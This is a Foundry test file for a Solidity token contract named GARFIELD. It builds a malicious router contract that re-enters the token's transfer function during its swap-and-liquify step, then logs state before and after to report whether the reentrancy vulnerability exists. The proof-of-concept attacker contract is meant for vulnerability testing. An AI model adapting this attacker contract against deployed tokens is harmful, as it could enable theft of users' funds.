// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.8;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/GARFIELD.sol";

contract DummyFactory {
    function createPair(address, address) external returns (address) {
        return address(0x123);
    }
}

contract MaliciousRouter {
    bool public reentryInitiated;
    address public tokenAddress;
    DummyFactory public dummyFactory;
    address payable private wethAddress = payable(address(0x1));

    constructor() public {
        dummyFactory = new DummyFactory();
    }

    function setTokenAddress(address _tokenAddress) public {
        tokenAddress = _tokenAddress;
    }

    function factory() external view returns (address) {
        return address(dummyFactory);
    }

    function WETH() external view returns (address) {
        return wethAddress;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint, uint, address[] calldata, address, uint
    ) external {
        reentryInitiated = true;
        (bool success, ) = tokenAddress.call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(this),
                1 ether
            )
        );
        success; // silence unused var warning
    }

    function addLiquidityETH(
        address,
        uint,
        uint,
        uint,
        address,
        uint
    ) external payable returns (uint, uint, uint) {
        return (0, 0, 0);
    }
}

contract ReentrancyTest is Test {
    GARFIELD public token;
    MaliciousRouter public maliciousRouter;
    address public owner = address(this);
    address public victim = address(0x2);
    uint256 public constant MIN_TOKENS = 0.02 ether;

    function setUp() public {
        maliciousRouter = new MaliciousRouter();
        token = new GARFIELD(payable(address(maliciousRouter)));

        maliciousRouter.setTokenAddress(address(token));

        token.setSwapAndLiquifyEnabled(true);
        token.setLiquidityFeePercent(5);
        token.setTaxFeePercent(5);
        token.setMaxTxPercent(10000);

        // Fund token contract to meet swap threshold
        token.transfer(address(token), MIN_TOKENS);
    }

    function test_ReentrancyVulnerability() public {
        // (i) Pre-trigger action and state snapshot
        console.log("--- (i) BEFORE-Trigger Action and State Snapshot ---");
        console.log("Action: query token.balanceOf(address(maliciousRouter))");
        uint256 routerBalBefore = token.balanceOf(address(maliciousRouter));
        uint256 tokenContractBalBefore = token.balanceOf(address(token));
        uint256 victimBalBefore = token.balanceOf(victim);
        bool reentryBefore = maliciousRouter.reentryInitiated();

        console.log("maliciousRouter token balance before:", routerBalBefore);
        console.log("token contract token balance before:", tokenContractBalBefore);
        console.log("victim token balance before:", victimBalBefore);
        console.log("reentryInitiated before (0=false, 1=true):", reentryBefore ? uint256(1) : uint256(0));

        // (ii) Trigger operation
        console.log("--- (ii) Trigger Operation ---");
        console.log("Executing token.transfer(victim, 1 ether)");
        token.transfer(victim, 1 ether);

        // (iii) Post-trigger action and state snapshot
        console.log("--- (iii) AFTER-Trigger Action and State Snapshot ---");
        console.log("Action: query token.balanceOf(address(maliciousRouter))");
        uint256 routerBalAfter = token.balanceOf(address(maliciousRouter));
        uint256 tokenContractBalAfter = token.balanceOf(address(token));
        uint256 victimBalAfter = token.balanceOf(victim);
        bool reentryAfter = maliciousRouter.reentryInitiated();

        console.log("maliciousRouter token balance after:", routerBalAfter);
        console.log("token contract token balance after:", tokenContractBalAfter);
        console.log("victim token balance after:", victimBalAfter);
        console.log("reentryInitiated after (0=false, 1=true):", reentryAfter ? uint256(1) : uint256(0));

        // (iv) Comparison verdict
        console.log("--- (iv) Comparison Verdict ---");
        bool routerBalanceChanged = routerBalAfter != routerBalBefore;
        bool tokenContractBalanceChanged = tokenContractBalAfter != tokenContractBalBefore;
        bool reentryFlagChanged = reentryAfter != reentryBefore;

        console.log("Router balance changed (0=false, 1=true):", routerBalanceChanged ? uint256(1) : uint256(0));
        console.log("Token contract balance changed (0=false, 1=true):", tokenContractBalanceChanged ? uint256(1) : uint256(0));
        console.log("Reentry flag changed (0=false, 1=true):", reentryFlagChanged ? uint256(1) : uint256(0));

        bool exploited = reentryFlagChanged || routerBalanceChanged || tokenContractBalanceChanged;

        if (exploited) {
            console.log("Vulnerability Exists: malicious router invocation/reentry detected during token transfer");
        } else {
            console.log("Vulnerability not Exist: no router reentry or balance change detected");
        }
    }
}